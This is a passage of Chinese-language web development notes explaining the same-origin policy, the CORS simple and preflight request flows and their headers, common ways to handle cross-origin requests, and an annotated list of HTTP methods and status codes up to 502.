<p>允许以下对 Location 方法与属性的跨域访问：</p>
<table>
<thead>
<tr>
<th>方法</th>
</tr>
</thead>
<tbody><tr>
<td>location.replace</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>属性</th>
<th>是否可读写</th>
</tr>
</thead>
<tbody><tr>
<td>URLUtils.href</td>
<td>只写</td>
</tr>
</tbody></table>
<p>某些浏览器允许访问除上述外更多的属性。</p>
<h4 id="跨域数据存储访问"><a href="#跨域数据存储访问" class="headerlink" title="跨域数据存储访问"></a>跨域数据存储访问</h4><p>访问存储在浏览器中的数据，如 LocalStorage 和 IndexedDB，是以源进行分隔的。每个源都拥有自己单独的存储空间，一个源中的 JavaScript 脚本不能对属于其它源的数据进行读写操作。</p>
<p>Cookie 使用不同的源定义方式。一个页面可以为本域和父域设置 Cookie，只要父域不是顶域（公共后缀 public suffix）即可。无论使用哪个协议或端口号，浏览器都允许给定的域及其任何子域（sub-domains）访问 Cookie。当你设置 Cookie 时，可以使用 Domain、Path、Secure 和 HttpOnly 标记来限定其可访问性。</p>
<p>当你读取 Cookie 时，你无法知道它是在哪里被设置的。即使你只使用安全的 https 连接，你看到的任何 Cookie 都有可能是使用不安全的连接进行设置的。</p>
<h3 id="CORS-使用场景"><a href="#CORS-使用场景" class="headerlink" title="CORS 使用场景"></a>CORS 使用场景</h3><p>跨域资源共享标准（Cross-Origin Sharing Standard）允许在下列场景中使用跨域 HTTP 请求：</p>
<ul>
<li><p>由 XMLHttpRequest 或 Fetch 发起的跨域 HTTP 请求</p>
</li>
<li><p>Web 字体（CSS 中通过@font-face 引用跨域字体字体）</p>
</li>
<li><p>WebGL 贴图</p>
</li>
<li><p>使用 drawImage 将 Image/Video 画面绘制到 canvas</p>
</li>
</ul>
<h3 id="功能概述"><a href="#功能概述" class="headerlink" title="功能概述"></a>功能概述</h3><p>跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站点通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器产生副作用的 HTTP 请求方法（特别是 GET 以外的 HTTP 请求，或者搭配某些 MIME 类型的 POST 请求），浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨域请求。服务器确认允许后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 Cookie 和 HTTP 认证相关数据）。</p>
<p>CORS 请求失败会产生错误，但是为了安全，在 JavaScript 代码层面是无法获知到底具体是哪里出了问题。你只能查看浏览器的控制台以得知具体是哪里出现了错误。</p>
<h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><p>某些请求不会触发 CORS 预检请求。我们称这样的请求为“简单请求”。</p>
<h4 id="简单请求的必要条件"><a href="#简单请求的必要条件" class="headerlink" title="简单请求的必要条件"></a>简单请求的必要条件</h4><p>简单请求需要全部满足下列四个条件：</p>
<ol>
<li><p>使用下列三个方法之一</p>
<ul>
<li><p>GET</p>
</li>
<li><p>HEAD</p>
</li>
<li><p>POST</p>
</li>
</ul>
</li>
<li><p>除用户代理自动设置的头部字段（如 Connection、User-Agent、Fetch 规范中定义的禁用头部名称）外，仅可手动设置 Fetch 规范中定义的 CORS 安全请求头如下，而不得设置其他头部字段</p>
<ul>
<li><p>Accept</p>
</li>
<li><p>Accept-Language</p>
</li>
<li><p>Content-Language</p>
</li>
<li><p>Content-Type（仅限为下列三者之一）</p>
<ul>
<li><p>text/plain</p>
</li>
<li><p>multipart/form-data</p>
</li>
<li><p>application/x-www-form-urlencoded</p>
</li>
</ul>
</li>
<li><p>HTML 头部 header field 字段</p>
<ul>
<li><p>DPR</p>
</li>
<li><p>Downlink</p>
</li>
<li><p>Save-Data</p>
</li>
<li><p>Viewport-Width</p>
</li>
<li><p>Width</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>请求中的任意 XMLHttpRequestUpload 对象均没有注册任何事件监听器，XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问</p>
</li>
<li><p>请求中没有使用 ReadableStream 对象</p>
</li>
</ol>
<h4 id="简单请求基本流程"><a href="#简单请求基本流程" class="headerlink" title="简单请求基本流程"></a>简单请求基本流程</h4><p>一、对于简单请求，浏览器会直接发出，发送过程中会自动增加一个 Origin 字段来标识请求发送方的源。</p>
<ul>
<li>Origin：说明了请求来自哪个源，格式为（协议、主机、端口）</li>
</ul>
<p>二、服务端则根据 Origin 字段决定是否同意该请求。若 Origin 指定的源不在许可范围，服务器会返回一个正常的 HTTP 响应。浏览器发现响应的头信息中没有包含 Access-Control-Allow-Origin 字段，就会抛出一个错误，被 XMLHttpRequest 的 onerror 回调函数捕获。若 Origin 指定的源在许可范围内，服务器返回的响应，会包含访问控制的响应头字段 Access-Control-Allow-Origin，浏览器收到响应后，判断自己的 Origin 在 Access-Control-Allow-Origin 允许的源中，正常接收响应。当然，请求的源在许可范围时，服务端除了必选字段 Access-Control-Allow-Origin 外，还可能添加其他可选的访问控制头。</p>
<ul>
<li><p>Access-Control-Allow-Origin：必有字段，表示许可访问的源，通常是指定一个具体的源，但要使资源能够被任意源访问，则指定为“*”通配符。注意，该头部的默认配置是不支持指定多个具体的源地址的，需要借助服务器变量等方式实现。</p>
</li>
<li><p>Access-Control-Allow-Credentials：可选字段，为布尔值，在简单请求中表示客户端 AJAX 请求 withCredentials 设置为 true 时，浏览器是否可以读取响应的内容。在预检请求中表示是否允许浏览器发送 Cookie。</p>
<p>虽然该字段在两种请求中作用机制有所不同，但目的是相同的，即是否接收浏览器发送的 Cookie。之所以有两种机制，则是因为简单请求没有预检，浏览器无法阻止用户发送 Cookie，那么就只能拦截响应的内容。而预检请求告知了浏览器服务端不接受 Cookie 时，浏览器就不会发送 Cookie 了。</p>
<p>另外值得注意的一点是，要接收携带 Cookie 的请求，服务端的 Access-Control-Allow-Origin 字段不可设置为通配符“*”，而应该设置为一个具体的源，否则请求会失败。</p>
</li>
<li><p>Access-Control-Expose-Headers：可选字段。CORS 请求时，XMLHttpRequest 对象的 getResponseHeader() 方法只能拿到 6 个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。若想要获取到其他字段，就必需在 Access-Control-Expose-Headers 里面指定。</p>
</li>
</ul>
<h3 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h3><p>除简单请求外，都是需预检（preflight）的请求，也就是常说的非简单请求。非简单请求要求首先使用 OPTIONS 方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。预检请求避免了跨域请求对服务器端的用户数据产生未预期的影响。常见的非简单请求的情况是使用 PUT 或 DELETE 方法的请求，或 Content-Type 为 application/json 的请求。</p>
<h4 id="预检请求基本流程"><a href="#预检请求基本流程" class="headerlink" title="预检请求基本流程"></a>预检请求基本流程</h4><p>一、当浏览器发现用户发要出一个非简单请求时，就先自动发出一个方法为 OPTIONS 的预检请求，请求头信息中主要包含 Origin 及预检请求的两个特殊头字段：</p>
<ul>
<li><p>Access-Control-Request-Method：必要字段，该字段用以列出浏览器的 CORS 请求会用到什么 HTTP 方法</p>
</li>
<li><p>Access-Control-Request-Headers：可选字段，该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段</p>
</li>
</ul>
<p>二、服务器收到预检请求以后，检查了 Origin、Access-Control-Request-Method 和 Access-Control-Request-Headers 字段后，如果发现不符合服务器的设定，就会直接返回一个正常的 HTTP 响应。浏览器发现响应中没有任何 CORS 相关的头信息字段，就会认为服务端不同意预检请求，进而抛出一个错误，被 XMLHttpRequest 的 onerror 回调函数捕获。若服务器检查预检请求后，确认允许，则会在响应中加上 CORS 相关的头信息字段并返回响应。</p>
<ul>
<li><p>Access-Control-Allow-Methods：必要字段，该字段是一个逗号分隔的字符串，表明服务器支持的<strong>所有</strong>跨域请求的方法。注意这里返回的是所有支持的方法，而不单是浏览器请求的那个方法，这避免了多次预检请求。</p>
</li>
<li><p>Access-Control-Allow-Headers：若请求中包含 Access-Control-Request-Headers 字段，则该字段为必要字段，是一个逗号分隔的字符串，表明服务器所支持的所有头信息字段，不限于浏览器本次预检请求的字段。</p>
</li>
<li><p>Access-Control-Allow-Credentials：同简单请求相同。</p>
</li>
<li><p>Access-Control-Max-Age：可选字段，表示本次预检请求的有效期，单位为秒。在预检请求有效期内，无需再次发出预检请求（浏览器自身还维护了一个最大有效时间，若 Access-Control-Max-Age 设置的有效时间超过了最大有效时间，将不会生效）。</p>
</li>
</ul>
<p>三、一旦预检请求的响应验证通过，客户端将向服务端发送真实请求，真实请求类似简单请求，请求时带有 Origin 头字段，服务器的响应则带有 Access-Control-Allow-Origin 头字段。浏览器在预检响应的有效期内的非简单请求，将不再发送预检请求，变得和简单请求一样了。</p>
<h3 id="解决跨域的几种方式"><a href="#解决跨域的几种方式" class="headerlink" title="解决跨域的几种方式"></a>解决跨域的几种方式</h3><ol>
<li><p>CORS：本节内容，解决跨域的最佳实践；</p>
</li>
<li><p>JSONP：由于 script 标签不受跨域影响的特性，前端定义好回调函数，并放入 script 标签的 url 中，再让服务端收到请求后将信息带在回调函数中；</p>
</li>
<li><p>Nginx 反向代理：通过同源地址代理访问跨域地址，规避浏览器同源策略；</p>
</li>
<li><p>Websocket：Websocket 协议不在浏览器同源策略限制范围内，可使用 Websocket 协议解决跨域问题；</p>
</li>
<li><p>其他方式：window.postMessage、window.name、document.domain、location.hash</p>
</li>
</ol>
<h2 id="HTTP-请求方法"><a href="#HTTP-请求方法" class="headerlink" title="HTTP 请求方法"></a>HTTP 请求方法</h2><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>请求一个指定资源，只应用于获取数据（幂等），常用于请求数据</td>
</tr>
<tr>
<td>HEAD</td>
<td>与 GET 请求相同，只是响应中只包含头部，没有响应体</td>
</tr>
<tr>
<td>POST</td>
<td>用于将实体提交到指定资源，通常会导致服务器上的状态变化（非幂等），常用于新增数据</td>
</tr>
<tr>
<td>PUT</td>
<td>用于将载荷提交到指定资源，替换指定资源的原载荷，常用于修改数据</td>
</tr>
<tr>
<td>PATCH</td>
<td>用于修改部分资源，是对 PUT 方法的补充</td>
</tr>
<tr>
<td>DELETE</td>
<td>用于删除指定的资源</td>
</tr>
<tr>
<td>OPTIONS</td>
<td>用于描述访问目标资源时通信的选项，常用于预检请求</td>
</tr>
<tr>
<td>CONNECT</td>
<td>建立一个到目标资源服务器的隧道</td>
</tr>
<tr>
<td>TRACE</td>
<td>沿到目标资源的路径执行一个环回测试</td>
</tr>
</tbody></table>
<h2 id="HTTP-响应代码"><a href="#HTTP-响应代码" class="headerlink" title="HTTP 响应代码"></a>HTTP 响应代码</h2><p>HTTP 响应状态代码指示特定 HTTP 请求是否已经成功完成。响应分为五类：信息响应（100-199），成功响应（200-299），重定向（300-399），客户端错误（400-499）和服务器错误（500-599）。</p>
<h3 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h3><h4 id="100-Continue"><a href="#100-Continue" class="headerlink" title="100 Continue"></a>100 Continue</h4><p>这个临时响应表明，迄今为止的所有内容都是可行的，客户端应该继续请求，如果已经完成，则忽略它。</p>
<h4 id="101-Switching-Protocol"><a href="#101-Switching-Protocol" class="headerlink" title="101 Switching Protocol"></a>101 Switching Protocol</h4><p>该状态代码是服务端响应客户端 Upgrade 头请求的，表示服务器正在切换协议，协议切换只能升级，而不能降级。</p>
<h4 id="102-Processing（WebDAV：Web-Distributed-Authoring-and-Versioning）"><a href="#102-Processing（WebDAV：Web-Distributed-Authoring-and-Versioning）" class="headerlink" title="102 Processing（WebDAV：Web Distributed Authoring and Versioning）"></a>102 Processing（WebDAV：Web Distributed Authoring and Versioning）</h4><p>表示服务器已收到并正在处理请求，但没有响应可用。</p>
<h4 id="103-Early-Hints"><a href="#103-Early-Hints" class="headerlink" title="103 Early Hints"></a>103 Early Hints</h4><p>此状态码主要与 Link 链接头一起使用，允许用户代理在服务器仍在准备其他响应时预加载资源。</p>
<h3 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h3><h4 id="200-OK"><a href="#200-OK" class="headerlink" title="200 OK"></a>200 OK</h4><p>请求成功。</p>
<h4 id="201-Created"><a href="#201-Created" class="headerlink" title="201 Created"></a>201 Created</h4><p>请求已成功，并因此创建了一个新的资源。这通常是 POST 请求或 PUT 请求后返回的响应。</p>
<h4 id="202-Accepted"><a href="#202-Accepted" class="headerlink" title="202 Accepted"></a>202 Accepted</h4><p>请求已收到，但还未响应，没有结果。该状态码表示没有异步响应能表明当前请求的结果，预期另外的进程和服务去处理请求，或批处理。</p>
<h4 id="203-Non-Authoritative-Information"><a href="#203-Non-Authoritative-Information" class="headerlink" title="203 Non-Authoritative Information"></a>203 Non-Authoritative Information</h4><p>服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前信息可能是原始版本的子集或超集。</p>
<h4 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h4><p>服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。由于 204 响应禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。</p>
<h4 id="205-Reset-Content"><a href="#205-Reset-Content" class="headerlink" title="205 Reset Content"></a>205 Reset Content</h4><p>服务器成功处理了请求，且没有返回任何内容。但是与 204 响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。与 204 响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。</p>
<h4 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h4><p>服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或迅雷这类 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。</p>
<h4 id="207-Multi-Status（WebDAV）"><a href="#207-Multi-Status（WebDAV）" class="headerlink" title="207 Multi-Status（WebDAV）"></a>207 Multi-Status（WebDAV）</h4><p>WebDAV 扩展的状态码，代表之后的消息体将是一个 XML 消息，并且可能依照之前子请求数量不同，包含一系列独立的响应代码。</p>
<h4 id="208-Already-Reported（WebDAV）"><a href="#208-Already-Reported（WebDAV）" class="headerlink" title="208 Already Reported（WebDAV）"></a>208 Already Reported（WebDAV）</h4><p>在<code>&lt;dav:propstat&gt;</code>响应中使用，用以防止在同一个集合中重复枚举内部成员的多重绑定。</p>
<h4 id="226-IM-Used（HTTP-Delta-encoding）"><a href="#226-IM-Used（HTTP-Delta-encoding）" class="headerlink" title="226 IM Used（HTTP Delta encoding）"></a>226 IM Used（HTTP Delta encoding）</h4><p>服务器已经完成了对资源的 GET 请求，并且响应是对当前实例应用的一个或多个实例操作结果的表示。</p>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><h4 id="300-Multiple-Choice"><a href="#300-Multiple-Choice" class="headerlink" title="300 Multiple Choice"></a>300 Multiple Choice</h4><p>被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。除非额外指定，否则该响应可缓存。</p>
<h4 id="301-Moved-Permanetly"><a href="#301-Moved-Permanetly" class="headerlink" title="301 Moved Permanetly"></a>301 Moved Permanetly</h4><p>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。</p>
<h4 id="302-Found"><a href="#302-Found" class="headerlink" title="302 Found"></a>302 Found</h4><p>请求的资源现在临时从不同的 URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在 Cache-Control 或 Expires 中进行了指定的情况下，这个响应才是可缓存的。</p>
<p>如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</p>
<p>虽然 RFC 1945 和 RFC 2068 规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将 302 响应视作 303 响应，并且使用 GET 方法访问在 Location 中规定的 URI，而无视原先请求的方法。因此状态码 303 和 307 被添加进来，用以明确服务器期待客户端进行何种反应。</p>
<h4 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h4><p>对应当前请求的响应可以在另一个 URI 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的 POST 请求输出重定向到一个新的资源。303 响应本身是禁止被缓存的，但重定向后的响应可能被缓存。</p>
<h4 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h4><p>客户端发送的请求中带有 If-Modified-Since 或 If-None-Match 头部，说明客户端已经有当前资源的缓存，但无法确认是否过期。而服务端资源未改变，使用此状态码告知客户端此资源未过期，可以继续使用，无需重新传输资源。304 响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。</p>
<h4 id="305-Use-Proxy（Deprecated）"><a href="#305-Use-Proxy（Deprecated）" class="headerlink" title="305 Use Proxy（Deprecated）"></a>305 Use Proxy（Deprecated）</h4><p>被请求的资源必须通过指定代理才能访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应的资源。只有原始服务器才能建立 305 响应。</p>
<h4 id="306-Switch-Proxy（Unused）"><a href="#306-Switch-Proxy（Unused）" class="headerlink" title="306 Switch Proxy（Unused）"></a>306 Switch Proxy（Unused）</h4><p>最初是指“后续请求应使用指定的代理”。在最新的规范中，306 状态码已经不再使用。</p>
<h4 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h4><p>与 302 临时重定向大致相同，唯一的区别是客户端不能改变 HTTP 请求的方法，若第一次请求是以 POST 方法发起的，那么后续请求也必需使用 POST 方法。</p>
<h4 id="308-Permanent-Redirect"><a href="#308-Permanent-Redirect" class="headerlink" title="308 Permanent Redirect"></a>308 Permanent Redirect</h4><p>与 301 永久重定向大致相同，唯一的区别是客户端不能改变 HTTP 请求的方法，若第一次请求是以 POST 方法发起的，那么后续请求也必需使用 POST 方法。</p>
<h3 id="客户端错误"><a href="#客户端错误" class="headerlink" title="客户端错误"></a>客户端错误</h3><h4 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h4><ol>
<li><p>语义有误，当前请求无法被服务器理解。</p>
</li>
<li><p>请求参数有误。</p>
</li>
</ol>
<h4 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h4><p>当前请求需要用户身份验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么 401 响应代表服务器验证已经拒绝了该证书。如果 401 响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。</p>
<p>有些网站禁止某些 IP 地址时，响应状态码会显示为 401，表示拒绝访问网站。</p>
<h4 id="402-Payment-Required"><a href="#402-Payment-Required" class="headerlink" title="402 Payment Required"></a>402 Payment Required</h4><p>此响应代码保留以便未来使用，最初设计是用于数字支付系统，现在处于未使用状态。Google Developers API 会使用此状态码，表示开发人员已超过请求的每日限制。</p>
<h4 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h4><p>服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个 404 响应，假如它不希望让客户端获得任何信息。</p>
<h4 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h4><p>请求失败，请求所希望得到的资源未在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用 410 状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404 这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或没有其他适合的响应可用的情况下。</p>
<h4 id="405-Method-Not-Allowed"><a href="#405-Method-Not-Allowed" class="headerlink" title="405 Method Not Allowed"></a>405 Method Not Allowed</h4><p>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回 405 错误。</p>
<h4 id="406-Not-Acceptable"><a href="#406-Not-Acceptable" class="headerlink" title="406 Not Acceptable"></a>406 Not Acceptable</h4><p>请求资源的内容特性无法满足请求头中的条件，因而无法生成响应体。</p>
<h4 id="407-Proxy-Authentication-Required"><a href="#407-Proxy-Authentication-Required" class="headerlink" title="407 Proxy Authentication Required"></a>407 Proxy Authentication Required</h4><p>与 401 响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。</p>
<h4 id="408-Request-Timeout"><a href="#408-Request-Timeout" class="headerlink" title="408 Request Timeout"></a>408 Request Timeout</h4><p>请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。</p>
<h4 id="409-Conflict"><a href="#409-Conflict" class="headerlink" title="409 Conflict"></a>409 Conflict</h4><p>由于和被请求的资源当前状态之间存在冲突，请求无法完成。这个代码只允许用于下面的情况：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。</p>
<h4 id="410-Gone"><a href="#410-Gone" class="headerlink" title="410 Gone"></a>410 Gone</h4><p>被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的情况应该被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是永久的，那么就应该使用 404 状态码。除非额外说明，否则这个响应是可缓存的。</p>
<p>大多数服务端不会使用此状态码，而是直接使用 404 状态码。</p>
<h4 id="411-Length-Required"><a href="#411-Length-Required" class="headerlink" title="411 Length Required"></a>411 Length Required</h4><p>服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头后，客户端可以再次提交该请求。</p>
<h4 id="412-Precondition-Failed"><a href="#412-Precondition-Failed" class="headerlink" title="412 Precondition Failed"></a>412 Precondition Failed</h4><p>服务器在验证请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</p>
<h4 id="413-Request-Entity-Too-Large"><a href="#413-Request-Entity-Too-Large" class="headerlink" title="413 Request Entity Too Large"></a>413 Request Entity Too Large</h4><p>服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间后重新尝试。</p>
<h4 id="414-Request-URI-Too-Long"><a href="#414-Request-URI-Too-Long" class="headerlink" title="414 Request-URI Too Long"></a>414 Request-URI Too Long</h4><p>请求的 URI 长度超过了服务器能够解析的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括：</p>
<ul>
<li><p>本应使用 POST 方法的表单提交变成了 GET 方法，导致查询字符串（Query String）过长。</p>
</li>
<li><p>重定向 URI“黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致大若干次重定向后 URI 超长。</p>
</li>
<li><p>客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行。没有此类漏洞的服务器，应当返回 414 状态码。</p>
</li>
</ul>
<h4 id="415-Unsupported-Media-Type"><a href="#415-Unsupported-Media-Type" class="headerlink" title="415 Unsupported Media Type"></a>415 Unsupported Media Type</h4><p>对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。</p>
<h4 id="416-Requested-Range-Not-Satisfiable"><a href="#416-Requested-Range-Not-Satisfiable" class="headerlink" title="416 Requested Range Not Satisfiable"></a>416 Requested Range Not Satisfiable</h4><p>如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回 416 状态码。</p>
<h4 id="417-Expectation-Failed"><a href="#417-Expectation-Failed" class="headerlink" title="417 Expectation Failed"></a>417 Expectation Failed</h4><p>此响应代码意味着服务器无法满足 Expect 请求头字段指示的期望值。</p>
<h4 id="418-I’m-a-teapot"><a href="#418-I’m-a-teapot" class="headerlink" title="418 I’m a teapot"></a>418 I’m a teapot</h4><p>服务器拒绝尝试用“茶壶冲泡咖啡”。</p>
<p>该状态码是 1998 年 IETF 的愚人节笑话，在 RFC2324 超文本咖啡壶控制协议中定义，并不需要在真实的 HTTP 服务器中定义。当一个控制茶壶的 HTCPCP 收到 BREW 或 POST 指令要求其煮咖啡时应当回传此错误。这个状态码在某些网站与项目中被作为彩蛋使用。</p>
<h4 id="421-Misdirected-Request"><a href="#421-Misdirected-Request" class="headerlink" title="421 Misdirected Request"></a>421 Misdirected Request</h4><p>该请求针对的是无法产生响应的服务器。这可以由服务器发送，该服务器未配置针对包含在请求 URI 中的方案和权限的组合产生响应。</p>
<h4 id="422-Unprocessable-Entity（WebDAV）"><a href="#422-Unprocessable-Entity（WebDAV）" class="headerlink" title="422 Unprocessable Entity（WebDAV）"></a>422 Unprocessable Entity（WebDAV）</h4><p>请求格式良好，但由于语义错误而无法处理。</p>
<h4 id="423-Locked（WebDAV）"><a href="#423-Locked（WebDAV）" class="headerlink" title="423 Locked（WebDAV）"></a>423 Locked（WebDAV）</h4><p>正在访问的资源被锁定。</p>
<h4 id="424-Failed-Dependency（WebDAV）"><a href="#424-Failed-Dependency（WebDAV）" class="headerlink" title="424 Failed Dependency（WebDAV）"></a>424 Failed Dependency（WebDAV）</h4><p>由于先前的请求失败，所以此次请求失败。</p>
<h4 id="425-Too-Early"><a href="#425-Too-Early" class="headerlink" title="425 Too Early"></a>425 Too Early</h4><p>服务器拒绝处理在 Early Data 中的请求，以防范重播攻击的风险。</p>
<h4 id="426-Upgrade-Required"><a href="#426-Upgrade-Required" class="headerlink" title="426 Upgrade Required"></a>426 Upgrade Required</h4><p>服务器拒绝使用当前协议执行请求，但可能在客户机升级到其他协议后愿意这样做。服务器在 426 响应中发送 Upgrade 头以指示所需的协议。</p>
<h4 id="428-Precondition-Required"><a href="#428-Precondition-Required" class="headerlink" title="428 Precondition Required"></a>428 Precondition Required</h4><p>原始服务器要求该请求是有条件的。旨在防止“丢失更新”问题，即客户端获取资源状态，修改该状态并将其返回服务器，同时第三方修改服务器上的状态，从而导致冲突。</p>
<h4 id="429-Too-Many-Requests"><a href="#429-Too-Many-Requests" class="headerlink" title="429 Too Many Requests"></a>429 Too Many Requests</h4><p>用户在给定的时间内发送了太多请求（“限制请求速率”）。</p>
<h4 id="431-Request-Header-Fields-Too-Large"><a href="#431-Request-Header-Fields-Too-Large" class="headerlink" title="431 Request Header Fields Too Large"></a>431 Request Header Fields Too Large</h4><p>服务器不愿意处理请求，因为它的请求头字段太大（Request Header Fields Too Large）。请求可以在减小请求头字段大小后重新提交。</p>
<h4 id="451-Unavailable-For-Legal-Reasons"><a href="#451-Unavailable-For-Legal-Reasons" class="headerlink" title="451 Unavailable For Legal Reasons"></a>451 Unavailable For Legal Reasons</h4><p>该访问因法律要求而被拒绝，该状态码由 IETF 在 2015 核准后新增，例如：由政府审查的网页。</p>
<h3 id="服务器错误"><a href="#服务器错误" class="headerlink" title="服务器错误"></a>服务器错误</h3><h4 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h4><p>服务器遇到了不知道如何处理的情况，无法完成对请求的处理，也无法给出具体错误信息。</p>
<h4 id="501-Not-Implemented"><a href="#501-Not-Implemented" class="headerlink" title="501 Not Implemented"></a>501 Not Implemented</h4><p>此请求方法不被服务器支持且无法被处理。只有 GET 和 HEAD 是要求服务器支持的，它们必定不会返回此错误代码。</p>
<h4 id="502-Bad-Gateway"><a href="#502-Bad-Gateway" class="headerlink" title="502 Bad Gateway"></a>502 Bad Gateway</h4><p>此错误响应表明服务器作为网关需要得到一个处理这个请求的响应，但是得到一个错误的响应。</p>
